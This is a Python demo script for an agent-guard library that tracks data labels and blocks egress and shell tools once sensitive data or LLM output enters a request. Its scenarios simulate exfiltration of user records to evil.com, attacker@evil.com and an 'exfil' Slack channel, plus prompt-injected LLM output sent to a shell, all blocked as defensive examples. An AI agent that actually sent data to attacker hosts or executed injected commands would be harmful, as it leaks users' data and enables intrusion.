# Copyright (c) 2025 Artoo Corporation
# Licensed under the Business Source License 1.1 (see LICENSE).
# Change Date: 2029-09-08  •  Change License: LGPL-3.0-or-later

"""Data flow tracking demo - semantic labeling for data provenance.

This demo shows how D2's data flow tracking provides blanket protection
against data exfiltration by tracking what kind of data has entered a request.

Unlike sequence enforcement (which blocks specific tool patterns), data flow
tracking blocks tools based on semantic labels: "Once sensitive data enters,
block ALL egress tools."

Run with:
    python examples/data_flow_demo.py
"""

from __future__ import annotations

import os
from pathlib import Path
import asyncio

from d2 import (
    configure_rbac,
    d2_guard,
    set_user,
    clear_user_context,
    get_facts,
    has_fact,
)
from d2.exceptions import PermissionDeniedError


# Set policy file path
EXAMPLES_DIR = Path(__file__).resolve().parent
POLICY_PATH = EXAMPLES_DIR / "data_flow_policy.yaml"
os.environ["D2_POLICY_FILE"] = str(POLICY_PATH)


# =============================================================================
# Guarded functions (simulate agent capabilities)
# =============================================================================

@d2_guard("database.read_users")
async def read_users():
    """Simulate reading user data from database."""
    print("  [DB] Reading users...")
    return {
        "users": [
            {"id": 1, "name": "Alice", "email": "alice@example.com"},
            {"id": 2, "name": "Bob", "email": "bob@example.com"},
        ]
    }


@d2_guard("database.read_payments")
async def read_payments():
    """Simulate reading payment data from database."""
    print("  [DB] Reading payments...")
    return {
        "payments": [
            {"user_id": 1, "amount": 99.99, "card_last4": "1234"},
        ]
    }


@d2_guard("secrets.get_api_key")
async def get_api_key():
    """Simulate retrieving API key."""
    print("  [SECRETS] Getting API key...")
    return {"api_key": "sk_live_abc123xyz"}


@d2_guard("http.request")
async def http_request(url: str, data: dict):
    """Simulate sending HTTP request to external service."""
    print(f"  [HTTP] Sending request to {url}...")
    return {"status": "sent"}


@d2_guard("email.send")
async def send_email(to: str, body: str):
    """Simulate sending email."""
    print(f"  [EMAIL] Sending email to {to}...")
    return {"status": "sent"}


@d2_guard("slack.post")
async def slack_post(channel: str, message: str):
    """Simulate posting to Slack."""
    print(f"  [SLACK] Posting to #{channel}...")
    return {"status": "posted"}


@d2_guard("analytics.summarize")
async def summarize(data: dict):
    """Simulate internal analytics processing."""
    print("  [ANALYTICS] Summarizing data...")
    return {"summary": f"Processed {len(data)} items"}


@d2_guard("llm.generate")
async def llm_generate(prompt: str):
    """Simulate LLM text generation."""
    print(f"  [LLM] Generating response...")
    return {"response": "echo 'Hello World'"}


@d2_guard("shell.execute")
async def shell_execute(command: str):
    """Simulate shell command execution."""
    print(f"  [SHELL] Executing: {command}")
    return {"status": "executed"}


@d2_guard("user.get_input")
async def get_user_input(prompt: str):
    """Simulate getting user input."""
    print(f"  [USER] Getting input...")
    return {"input": "user provided value"}


@d2_guard("logging.info")
async def log_info(message: str):
    """Simulate logging."""
    print(f"  [LOG] {message}")
    return {"status": "logged"}


# =============================================================================
# Demo scenarios
# =============================================================================

async def scenario_1_sensitive_data_blocks_egress():
    """Scenario 1: Sensitive data blocks ALL egress tools.
    
    Policy says:
      - @sensitive_data tools (database.read_*) label as SENSITIVE
      - SENSITIVE blocks @egress_tools (http.request, email.send, slack.post)
    """
    print("\n" + "=" * 70)
    print("SCENARIO 1: Sensitive data blocks ALL egress tools")
    print("=" * 70)
    print("\nPolicy: database.read_users → labels [SENSITIVE]")
    print("        SENSITIVE → blocks [@egress_tools]")
    print()
    
    set_user("agent-1", roles=["research_agent"])
    
    try:
        print("Step 1: Read sensitive data from database")
        users = await read_users()
        print(f"  ✓ Success! Current facts: {get_facts()}")
        
        print("\nStep 2: Try HTTP request (BLOCKED)")
        await http_request("https://example.com", users)
        print("  ✗ ERROR: Should have been blocked!")
    except PermissionDeniedError as e:
        print(f"  ✓ BLOCKED: {e.reason}")
    
    # Reset context and try other egress
    clear_user_context()
    set_user("agent-1", roles=["research_agent"])
    
    try:
        print("\nStep 3: Read data again (fresh context)")
        users = await read_users()
        print(f"  ✓ Success! Facts: {get_facts()}")
        
        print("\nStep 4: Try email (also BLOCKED)")
        await send_email("attacker@evil.com", str(users))
        print("  ✗ ERROR: Should have been blocked!")
    except PermissionDeniedError as e:
        print(f"  ✓ BLOCKED: {e.reason}")
    
    clear_user_context()
    set_user("agent-1", roles=["research_agent"])
    
    try:
        print("\nStep 5: Read data again (fresh context)")
        users = await read_users()
        
        print("\nStep 6: Try Slack (also BLOCKED)")
        await slack_post("exfil-channel", str(users))
        print("  ✗ ERROR: Should have been blocked!")
    except PermissionDeniedError as e:
        print(f"  ✓ BLOCKED: {e.reason}")
    
    print("\n✓ All egress channels blocked with ONE label rule!")
    clear_user_context()


async def scenario_2_internal_processing_allowed():
    """Scenario 2: Internal processing is allowed even with sensitive data."""
    print("\n" + "=" * 70)
    print("SCENARIO 2: Internal processing is allowed")
    print("=" * 70)
    print("\nSENSITIVE label only blocks egress, not internal tools")
    print()
    
    set_user("agent-1", roles=["research_agent"])
    
    try:
        print("Step 1: Read sensitive data")
        users = await read_users()
        print(f"  ✓ Success! Facts: {get_facts()}")
        
        print("\nStep 2: Process internally (analytics)")
        summary = await summarize(users)
        print(f"  ✓ Success! Result: {summary}")
        print(f"  Facts still: {get_facts()}")
        
        print("\n✓ Internal processing works fine with sensitive data!")
    except PermissionDeniedError as e:
        print(f"  ✗ Unexpected block: {e.reason}")
    
    clear_user_context()


async def scenario_3_pivot_attack_blocked():
    """Scenario 3: Pivot attacks are blocked (unlike sequence-only approach)."""
    print("\n" + "=" * 70)
    print("SCENARIO 3: Pivot attack blocked")
    print("=" * 70)
    print("\nAttacker tries different egress channels after one is blocked.")
    print("Data flow labels persist, blocking ALL paths.")
    print()
    
    set_user("agent-1", roles=["research_agent"])
    
    print("Step 1: Read sensitive data")
    users = await read_users()
    print(f"  ✓ Data loaded. Facts: {get_facts()}")
    
    print("\nStep 2: Try HTTP → BLOCKED")
    try:
        await http_request("https://evil.com", users)
    except PermissionDeniedError:
        print("  ✓ HTTP blocked")
    
    print("\nStep 3: Try Email → BLOCKED (facts persist!)")
    try:
        await send_email("attacker@evil.com", str(users))
    except PermissionDeniedError:
        print("  ✓ Email blocked")
    
    print("\nStep 4: Try Slack → BLOCKED (facts persist!)")
    try:
        await slack_post("exfil", str(users))
    except PermissionDeniedError:
        print("  ✓ Slack blocked")
    
    print(f"\nFacts at end: {get_facts()}")
    print("\n✓ ALL pivot attempts blocked because SENSITIVE label persists!")
    clear_user_context()


async def scenario_4_llm_output_blocks_execution():
    """Scenario 4: LLM output blocks code execution (CaMeL-style)."""
    print("\n" + "=" * 70)
    print("SCENARIO 4: LLM output blocks code execution")
    print("=" * 70)
    print("\nPolicy: llm.generate → labels [LLM_OUTPUT]")
    print("        LLM_OUTPUT → blocks [@execution_tools]")
    print("\nThis prevents prompt injection → RCE attacks!")
    print()
    
    set_user("agent-1", roles=["research_agent"])
    
    try:
        print("Step 1: Generate code with LLM")
        response = await llm_generate("Write a shell command")
        print(f"  ✓ LLM response: {response}")
        print(f"  Facts: {get_facts()}")
        
        print("\nStep 2: Try to execute LLM output (BLOCKED)")
        await shell_execute(response["response"])
        print("  ✗ ERROR: Should have been blocked!")
    except PermissionDeniedError as e:
        print(f"  ✓ BLOCKED: {e.reason}")
        print("\n✓ Prompt injection → code execution prevented!")
    
    clear_user_context()


async def scenario_5_multiple_labels_accumulate():
    """Scenario 5: Multiple labels accumulate from different sources."""
    print("\n" + "=" * 70)
    print("SCENARIO 5: Multiple labels accumulate")
    print("=" * 70)
    print("\nFacts from different tools accumulate throughout the request.")
    print()
    
    set_user("agent-1", roles=["research_agent"])
    
    try:
        print("Step 1: Read users")
        users = await read_users()
        print(f"  Facts: {get_facts()}")
        
        print("\nStep 2: Read payments")
        payments = await read_payments()
        print(f"  Facts: {get_facts()}")
        
        print("\nStep 3: Get API key")
        key = await get_api_key()
        print(f"  Facts: {get_facts()}")
        
        print(f"\n✓ Accumulated labels: {get_facts()}")
        print("  - SENSITIVE from database tools")
        print("  - SECRET from secrets tool")
        
        print("\nStep 4: Try logging (blocked by SECRET)")
        await log_info("Some message")
    except PermissionDeniedError as e:
        print(f"  ✓ BLOCKED: {e.reason}")
    
    clear_user_context()


async def scenario_6_clean_request_works():
    """Scenario 6: Clean requests without sensitive data work fine."""
    print("\n" + "=" * 70)
    print("SCENARIO 6: Clean requests work normally")
    print("=" * 70)
    print("\nWithout sensitive data, egress is allowed.")
    print()
    
    set_user("agent-1", roles=["research_agent"])
    
    try:
        print("Step 1: Analyze without sensitive data")
        result = await summarize({"items": [1, 2, 3]})
        print(f"  ✓ Result: {result}")
        print(f"  Facts: {get_facts()}")
        
        print("\nStep 2: HTTP request (ALLOWED - no blocking facts)")
        result = await http_request("https://api.example.com", {"query": "safe"})
        print(f"  ✓ Success: {result}")
        
        print("\n✓ Clean requests proceed normally!")
    except PermissionDeniedError as e:
        print(f"  ✗ Unexpected block: {e.reason}")
    
    clear_user_context()


async def main():
    """Run all data flow demo scenarios."""
    print("\n" + "=" * 70)
    print("D2 DATA FLOW TRACKING DEMO")
    print("=" * 70)
    print("\nThis demo shows semantic data labeling for preventing data leaks.")
    print("Unlike sequences (which block specific patterns), data flow tracking")
    print("provides blanket protection based on what KIND of data is in play.")
    
    # Initialize D2
    await configure_rbac()
    
    # Run scenarios
    await scenario_1_sensitive_data_blocks_egress()
    await scenario_2_internal_processing_allowed()
    await scenario_3_pivot_attack_blocked()
    await scenario_4_llm_output_blocks_execution()
    await scenario_5_multiple_labels_accumulate()
    await scenario_6_clean_request_works()
    
    print("\n" + "=" * 70)
    print("DEMO COMPLETE")
    print("=" * 70)
    print("\nKey takeaways:")
    print("  1. Labels persist for the entire request")
    print("  2. One label can block multiple tools (blanket protection)")
    print("  3. Internal processing is unaffected")
    print("  4. Labels accumulate from multiple sources")
    print("  5. Works alongside sequences and RBAC")
    print()


if __name__ == "__main__":
    asyncio.run(main())


